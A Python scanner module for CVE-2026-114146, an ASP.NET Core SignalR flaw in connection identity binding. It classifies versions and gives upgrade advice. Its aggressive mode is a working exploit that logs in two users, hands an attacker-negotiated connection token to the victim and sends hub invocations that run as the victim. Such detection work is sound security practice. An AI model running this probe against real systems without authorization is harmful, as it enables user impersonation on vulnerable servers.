from __future__ import annotations

import json
import secrets
import time
from typing import Any
from urllib.parse import quote, urlencode

from ...core.http import (
    HttpClient,
    is_transport_error,
    normalize_url,
)
from ...core.models import Confidence, Finding, Status
from ...core.versions import parse_version_required, parse_version_safe

CVE_ID = "CVE-2026-114146"
NAME = "ASP.NET Core SignalR connection identity binding bypass"
RULE = (
    "Microsoft.AspNetCore.Http.Connections 1.2.0 through 1.2.13; ASP.NET Core "
    "8.0 through 8.0.33, 9.0 through 9.0.22, 10.0 through 10.0.14, and "
    "11.0.0-preview.1 through 11.0.0-rc.3"
)
FIXED_RULE = "Upgrade to Http.Connections 1.2.14 or ASP.NET Core 8.0.34, 9.0.23, 10.0.15, 11.0.0, or newer"
HAS_EXPLOIT = True
INTRUSIVE = True
EXPLOIT_MODES = ["safe", "aggressive"]
HANDSHAKE = b'{"protocol":"json","version":1}\x1e'


def classify_version(version: str | None) -> str:
    parsed = parse_version_safe(version)
    if parsed is None:
        return Status.DETECTED_VERSION_UNKNOWN
    if parse_version_required("1.2.0") <= parsed < parse_version_required("1.2.14"):
        return Status.LIKELY_VULNERABLE
    if parse_version_required("1.2.14") <= parsed < parse_version_required("2.0.0"):
        return Status.PATCHED
    if parsed < parse_version_required("8.0.0"):
        return Status.NOT_AFFECTED
    if parsed < parse_version_required("8.0.34"):
        return Status.LIKELY_VULNERABLE
    if parsed < parse_version_required("9.0.0"):
        return Status.PATCHED
    if parsed < parse_version_required("9.0.23"):
        return Status.LIKELY_VULNERABLE
    if parsed < parse_version_required("10.0.0"):
        return Status.PATCHED
    if parsed < parse_version_required("10.0.15"):
        return Status.LIKELY_VULNERABLE
    lowered = (version or "").lower()
    if lowered.startswith(("11.0.0-preview", "11.0.0-rc")):
        return (
            Status.LIKELY_VULNERABLE
            if parsed < parse_version_required("11.0.0-rc.4")
            else Status.PATCHED
        )
    return Status.PATCHED


def passive_result(version: str | None) -> Finding:
    status = classify_version(version)
    if status == Status.LIKELY_VULNERABLE:
        detail = (
            f"Detected ASP.NET Core {version}. SignalR connections are not bound to the identity "
            "negotiated at connection establishment, so a different authenticated user can take "
            "over the negotiated connection before its first transport and have messages executed "
            "as the victim."
        )
        confidence = Confidence.HIGH
        action = FIXED_RULE
    elif status == Status.PATCHED:
        detail = f"Detected ASP.NET Core {version}, at or beyond the fixed release."
        confidence = Confidence.HIGH
        action = "No action is required for this CVE if the version is accurate."
    elif status == Status.NOT_AFFECTED:
        detail = f"Detected ASP.NET Core {version}, outside the published affected ranges."
        confidence = Confidence.HIGH
        action = "No action is required for this CVE."
    else:
        detail = "ASP.NET Core was detected, but its exact runtime/package version is unknown."
        confidence = Confidence.MEDIUM
        action = FIXED_RULE
    return Finding(
        cve=CVE_ID,
        name=NAME,
        status=status,
        confidence=confidence,
        component="ASP.NET Core / SignalR",
        component_version=version,
        affected_rule=RULE,
        exploit_available=HAS_EXPLOIT,
        detail=detail,
        action=action,
        vulnerability_type="Incorrect Authorization",
    )


def _login(client: HttpClient, base: str, template: str, user: str, timeout: int) -> bool:
    url = template.format(user=quote(user), password=quote(user))
    response = client.get(f"{base}{url}", timeout=timeout)
    return not is_transport_error(response) and response.get("status") == 200


def _negotiate(client: HttpClient, base: str, hub: str, timeout: int) -> str | None:
    response = client.request(f"{base}{hub}/negotiate?negotiateVersion=1", method="POST", timeout=timeout)
    if is_transport_error(response):
        return None
    try:
        data = json.loads(response.get("body") or "")
    except (json.JSONDecodeError, TypeError):
        return None
    if not isinstance(data, dict):
        return None
    token = data.get("connectionToken") or data.get("connectionId")
    return str(token) if token else None


def _transport(client: HttpClient, base: str, hub: str, token: str, payload: bytes, timeout: int) -> tuple[int, str]:
    response = client.request(
        f"{base}{hub}?{urlencode({'id': token})}",
        method="POST",
        headers={"Content-Type": "text/plain;charset=UTF-8"},
        data=payload,
        timeout=timeout,
    )
    if is_transport_error(response):
        return 0, ""
    return response.get("status", 0), response.get("body") or ""


def _poll(client: HttpClient, base: str, hub: str, token: str, timeout: int) -> None:
    # Long polling GET: the handshake response is delivered here; a timeout is expected.
    try:
        client.request(f"{base}{hub}?{urlencode({'id': token})}", method="GET", timeout=max(1, min(timeout, 3)))
    except (TimeoutError, OSError):
        pass


def _records(client: HttpClient, base: str, path: str, timeout: int) -> list[str]:
    response = client.get(f"{base}{path}", timeout=timeout)
    if is_transport_error(response):
        return []
    try:
        data = json.loads(response.get("body") or "")
    except (json.JSONDecodeError, TypeError):
        return []
    return [str(item) for item in data] if isinstance(data, list) else []


def run_aggressive_probe(
    target_url: str,
    attacker_user: str | None = None,
    victim_user: str | None = None,
    login_path: str = "/login?user={user}",
    hub_path: str = "/hub",
    records_path: str = "/records",
    timeout: int = 15,
    proxy: str | None = None,
) -> Finding:
    """Bind a negotiated connection to a different authenticated user.

    The attacker negotiates a SignalR connection, the victim makes the first
    transport request with the same connection token, and the attacker sends a
    hub invocation. Pre-fix the victim's transport is accepted and the
    invocation runs as the victim; the fixed runtime rejects the mismatch with
    403. The probe uses the lab's ``Record`` hub method and ``/records``
    endpoint to observe the identity.
    """
    base = normalize_url(target_url)
    if not attacker_user or not victim_user:
        return Finding(
            cve=CVE_ID,
            name=NAME,
            status="BLOCKED_EXTERNAL",
            confidence="MEDIUM",
            component="ASP.NET Core / SignalR",
            affected_rule=RULE,
            exploit_available=True,
            exploit_ran=False,
            proof_url=f"{base}{hub_path}",
            detail=(
                "The connection-binding proof needs two authenticated SignalR users (attacker and "
                "victim) plus a login route. Pass --aggressive-arg attacker_user=... victim_user=... "
                "and, if needed, login_path=/login?user={user} on an authorized staging site. "
                "Nothing was sent."
            ),
            action="Re-run with the lab accounts.",
        )

    attacker = HttpClient(timeout=timeout, proxy=proxy)
    victim = HttpClient(timeout=timeout, proxy=proxy)
    if not _login(attacker, base, login_path, attacker_user, timeout):
        return Finding(
            cve=CVE_ID,
            name=NAME,
            status="NOT_CONFIRMED",
            confidence="MEDIUM",
            component="ASP.NET Core / SignalR",
            affected_rule=RULE,
            exploit_available=True,
            exploit_ran=True,
            proof_url=f"{base}{login_path}",
            detail="The attacker login did not establish a session.",
            action="Verify the login route and the lab accounts.",
        )
    if not _login(victim, base, login_path, victim_user, timeout):
        return Finding(
            cve=CVE_ID,
            name=NAME,
            status="NOT_CONFIRMED",
            confidence="MEDIUM",
            component="ASP.NET Core / SignalR",
            affected_rule=RULE,
            exploit_available=True,
            exploit_ran=True,
            proof_url=f"{base}{login_path}",
            detail="The victim login did not establish a session.",
            action="Verify the login route and the lab accounts.",
        )

    marker = f"attack-{secrets.token_hex(4)}"
    control_marker = f"control-{secrets.token_hex(4)}"

    # Same-user control: negotiate and transport as the attacker, then invoke.
    control_token = _negotiate(attacker, base, hub_path, timeout)
    control_status = 0
    control_seen = False
    if control_token:
        control_status, _ = _transport(attacker, base, hub_path, control_token, HANDSHAKE, timeout)
        if control_status == 200:
            _poll(attacker, base, hub_path, control_token, timeout)
            send = json.dumps({"type": 1, "target": "Record", "arguments": [control_marker]}).encode() + b"\x1e"
            _transport(attacker, base, hub_path, control_token, send, timeout)
            _poll(attacker, base, hub_path, control_token, timeout)
            time.sleep(0.4)
            control_seen = f"{attacker_user}:{control_marker}" in _records(attacker, base, records_path, timeout)

    attack_token = _negotiate(attacker, base, hub_path, timeout)
    if not attack_token:
        return Finding(
            cve=CVE_ID,
            name=NAME,
            status="NOT_CONFIRMED",
            confidence="MEDIUM",
            component="ASP.NET Core / SignalR",
            affected_rule=RULE,
            exploit_available=True,
            exploit_ran=True,
            proof_url=f"{base}{hub_path}/negotiate",
            evidence={"control_status": control_status, "control_seen": control_seen},
            detail="The attacker could not negotiate a SignalR connection.",
            action="Verify that the SignalR hub is reachable and authenticated.",
        )

    victim_status, victim_body = _transport(victim, base, hub_path, attack_token, HANDSHAKE, timeout)
    evidence: dict[str, Any] = {
        "control_status": control_status,
        "control_seen": control_seen,
        "victim_transport_status": victim_status,
        "victim_transport_body": victim_body[:200],
        "marker": marker,
    }

    if victim_status == 403:
        return Finding(
            cve=CVE_ID,
            name=NAME,
            status="NOT_AFFECTED",
            confidence="HIGH",
            component="ASP.NET Core / SignalR",
            affected_rule=RULE,
            exploit_available=True,
            exploit_ran=True,
            proof_url=f"{base}{hub_path}",
            evidence=evidence,
            detail=(
                "The victim's first transport was rejected with 403 because the connection was "
                "negotiated by a different user, the 8.0.34/1.2.14 binding behaviour."
            ),
            action="No action is required for this CVE if the runtime is fixed.",
        )

    if victim_status != 200:
        return Finding(
            cve=CVE_ID,
            name=NAME,
            status="NOT_CONFIRMED",
            confidence="MEDIUM",
            component="ASP.NET Core / SignalR",
            affected_rule=RULE,
            exploit_available=True,
            exploit_ran=True,
            proof_url=f"{base}{hub_path}",
            evidence=evidence,
            detail="The victim's first transport returned neither 200 nor the fixed 403 rejection.",
            action="Review the hub authentication and transport configuration.",
        )

    _poll(victim, base, hub_path, attack_token, timeout)
    send = json.dumps({"type": 1, "target": "Record", "arguments": [marker]}).encode() + b"\x1e"
    _transport(attacker, base, hub_path, attack_token, send, timeout)
    _poll(victim, base, hub_path, attack_token, timeout)
    time.sleep(0.4)
    records = _records(attacker, base, records_path, timeout)
    observed = f"{victim_user}:{marker}" in records
    evidence["records"] = records[-5:]
    evidence["victim_identity_observed"] = observed

    if observed:
        return Finding(
            cve=CVE_ID,
            name=NAME,
            status="VULNERABLE",
            confidence="CONFIRMED",
            component="ASP.NET Core / SignalR",
            affected_rule=RULE,
            exploit_available=True,
            exploit_ran=True,
            proof_url=f"{base}{hub_path}",
            evidence=evidence,
            detail=(
                "The victim's first transport was accepted on a connection negotiated by the "
                f"attacker, and the attacker's invocation executed as the victim ({victim_user}). "
                "The fixed runtime rejects the transport with 403."
            ),
            action="Upgrade to ASP.NET Core 8.0.34, 9.0.23, 10.0.15, 11.0.0, or newer.",
        )

    return Finding(
        cve=CVE_ID,
        name=NAME,
        status="VULNERABLE",
        confidence="HIGH",
        component="ASP.NET Core / SignalR",
        affected_rule=RULE,
        exploit_available=True,
        exploit_ran=True,
        proof_url=f"{base}{hub_path}",
        evidence=evidence,
        detail=(
            "The victim's first transport was accepted on a connection negotiated by the attacker, "
            "proving the missing identity binding; the hub identity was not readable through the "
            "lab records endpoint."
        ),
        action="Upgrade to ASP.NET Core 8.0.34, 9.0.23, 10.0.15, 11.0.0, or newer.",
    )


def check(
    target_url: str,
    cms_version: str | None = None,
    run_exploit_check: bool = False,
    timeout: int = 15,
    proxy: str | None = None,
    exploit_mode: str = "safe",
    aggressive_command: str | None = None,
    aggressive_args: dict[str, Any] | None = None,
    **kwargs: Any,
) -> Finding:
    from ...core.args import aggressive_value

    passive = passive_result(cms_version)
    if not run_exploit_check:
        return passive

    if exploit_mode == "aggressive":
        if passive.status not in {Status.LIKELY_VULNERABLE, Status.DETECTED_VERSION_UNKNOWN}:
            passive.detail += " Aggressive proof skipped because the runtime was not detected as potentially affected."
            return passive
        result = run_aggressive_probe(
            target_url,
            attacker_user=aggressive_value(aggressive_args, aggressive_command, "attacker_user"),
            victim_user=aggressive_value(aggressive_args, aggressive_command, "victim_user"),
            login_path=aggressive_value(aggressive_args, aggressive_command, "login_path") or "/login?user={user}",
            hub_path=aggressive_value(aggressive_args, aggressive_command, "hub_path") or "/hub",
            records_path=aggressive_value(aggressive_args, aggressive_command, "records_path") or "/records",
            timeout=timeout,
            proxy=proxy,
        )
        result.component_version = passive.component_version
        return result

    passive.detail += " This module supports safe (version/surface) and aggressive (connection binding) modes."
    return passive


def affects_joomla_version(joomla_version: str | None) -> bool:
    return True


def metadata() -> dict[str, Any]:
    return {
        "cve": CVE_ID,
        "cms": "generic",
        "name": NAME,
        "component": "ASP.NET Core / SignalR",
        "affected_rule": RULE,
        "affected_versions": [
            ">=1.2.0,<1.2.14",
            ">=8.0.0,<8.0.34",
            ">=9.0.0,<9.0.23",
            ">=10.0.0,<10.0.15",
            "11.0.0-preview.1..11.0.0-rc.3",
        ],
        "exploit_available": HAS_EXPLOIT,
        "exploit_modes": EXPLOIT_MODES,
        "intrusive": INTRUSIVE,
        "vulnerability_type": "Incorrect Authorization",
        "module_version": "2.0.0",
        "last_reviewed": "2026-11-20",
        "updated": "2026-11-20",
        "required_detectors": ["aspnet"],
        "references": [
            "https://github.com/advisories/GHSA-67wp-ghc2-fw2g",
            "https://github.com/dotnet/aspnetcore/commit/514c86030195fd6b649bb26c48975a043d96b791",
            "https://advisories.gitlab.com/nuget/microsoft.aspnetcore.http.connections/CVE-2026-114146/",
            "https://msrc.microsoft.com/update-guide/vulnerability/CVE-2026-114146",
        ],
    }
